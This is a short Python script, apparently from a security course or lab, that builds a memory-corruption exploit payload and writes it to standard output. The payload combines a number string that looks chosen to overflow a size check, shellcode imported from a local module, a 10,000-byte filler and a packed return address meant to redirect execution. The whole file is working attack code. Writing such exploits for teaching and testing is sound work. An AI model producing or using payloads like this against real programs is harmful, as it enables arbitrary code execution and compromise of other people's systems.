from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(b'2147483904' + shellcode + ('\x12'*10000).encode('ASCII') + pack("<I", 0xfffe9400))